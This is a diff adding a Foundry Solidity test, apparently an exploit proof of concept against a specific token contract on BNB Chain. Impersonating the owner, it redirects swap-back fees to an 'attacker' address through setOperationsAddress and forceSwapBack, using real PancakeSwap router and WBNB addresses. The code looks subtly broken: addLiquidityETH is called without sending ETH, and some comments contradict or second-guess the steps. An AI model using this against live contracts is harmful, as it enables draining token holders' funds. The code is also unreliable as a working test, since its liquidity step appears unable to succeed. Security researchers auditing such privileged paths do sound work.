@@ -1,0 +1,142 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.15;
+
+import "forge-std/Test.sol";
+
+// Minimal interface for the vulnerable token
+interface IFoundationToken {
+    function owner() external view returns (address);
+    function swapTokensAtAmount() external view returns (uint256);
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address, uint256) external returns (bool);
+    function approve(address, uint256) external returns (bool);
+    function setOperationsAddress(address) external;
+    function forceSwapBack() external;
+    function enableTrading() external;
+    function dexRouter() external view returns (address);
+    function lpPair() external view returns (address);
+    function setAutomatedMarketMakerPair(address, bool) external;
+    function excludeFromFees(address, bool) external;
+    function withdrawStuckETH() external;
+    function tokensForOperations() external view returns (uint256);
+    function tokensForLiquidity() external view returns (uint256);
+    function tokensForBurn() external view returns (uint256);
+}
+
+// The token contract address
+address constant TOKEN = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
+
+// PancakeSwap Router on BSC
+address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+
+// WBNB (Wrapped BNB) on BSC
+address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+
+contract ExploitTest is Test {
+    IFoundationToken token;
+    address owner;
+    address attacker;
+
+    function setUp() public {
+        token = IFoundationToken(TOKEN);
+        owner = token.owner();
+        attacker = makeAddr("attacker");
+
+        // Label addresses for debugging
+        vm.label(TOKEN, "FoundationToken");
+        vm.label(owner, "Owner");
+        vm.label(attacker, "Attacker");
+        vm.label(ROUTER, "PancakeRouter");
+        vm.label(WBNB, "WBNB");
+    }
+
+    // Test that owner can redirect ETH to an arbitrary address via setOperationsAddress + forceSwapBack
+    function testControlledLowLevelCall() public {
+        // === 1. Impersonate the owner ===
+        vm.startPrank(owner);
+
+        // Give owner some BNB (WBNB) to add liquidity
+        deal(owner, 100 ether);
+
+        // Enable trading and swaps (required for forceSwapBack to work)
+        token.enableTrading();
+
+        // Exclude the contract and owner from fees (makes testing easier, but not required)
+        token.excludeFromFees(address(this), true);
+        token.excludeFromFees(owner, true);
+
+        // Set operationsAddress to the attacker's address (the malicious receiver)
+        token.setOperationsAddress(attacker);
+
+        // Get the PancakeSwap pair address
+        address pair = token.lpPair();
+        // Ensure the pair is an automated market maker pair (should already be set)
+        // We'll set it again to be safe (only owner can)
+        token.setAutomatedMarketMakerPair(pair, true);
+
+        // === 2. Add liquidity to create a pool ===
+        uint256 tokenAmount = 1_000_000 ether; // Amount of tokens to add as liquidity
+        // Owner needs to have enough tokens; they hold the entire initial supply
+        // Transfer some tokens to the pair to simulate a pool? Actually we need to add liquidity via router.
+        // We'll add liquidity by using the router.
+        uint256 ethAmount = 10 ether; // BNB amount to pair
+
+        // Approve router to spend tokens
+        token.approve(ROUTER, tokenAmount);
+
+        // Add liquidity
+        (bool success, ) = ROUTER.call(
+            abi.encodeWithSignature(
+                "addLiquidityETH(address,uint256,uint256,uint256,address,uint256)",
+                TOKEN,
+                tokenAmount,
+                0,
+                0,
+                address(0xdead),
+                block.timestamp
+            )
+        );
+        require(success, "Liquidity addition failed");
+
+        // After adding liquidity, the contract might have zero tokens. We need to generate fees.
+        // Simulate a buy by swapping ETH for tokens on the DEX.
+        // This will trigger fees that are sent to the contract.
+        address[] memory path = new address[](2);
+        path[0] = WBNB;
+        path[1] = TOKEN;
+        // Swap 1 BNB for tokens
+        ROUTER.call{value: 1 ether}(
+            abi.encodeWithSignature(
+                "swapExactETHForTokensSupportingFeeOnTransferTokens(uint256,address[],address,uint256)",
+                0,
+                path,
+                address(this),
+                block.timestamp
+            )
+        );
+
+        // Now the contract should have some tokens (fees) and non-zero tokensForOperations etc.
+        // Verify that the contract's fee tracking is >0
+        uint256 tokensForOps = token.tokensForOperations();
+        require(tokensForOps > 0, "No operations fees accumulated");
+
+        // Also ensure the contract has enough tokens to satisfy the swapBack condition
+        uint256 contractBalance = token.balanceOf(TOKEN);
+        uint256 swapAt = token.swapTokensAtAmount();
+        require(contractBalance >= swapAt, "Contract token balance too low");
+
+        // === 3. Trigger forceSwapBack ===
+        token.forceSwapBack();
+
+        vm.stopPrank();
+
+        // === 4. Assert that attacker received ETH ===
+        uint256 attackerBalance = attacker.balance;
+        assertGt(attackerBalance, 0, "Attacker should have received ETH from the swapBack call");
+    }
+
+    // Fallback to receive ETH from the DEX when swapping
+    receive() external payable {}
+}
+```
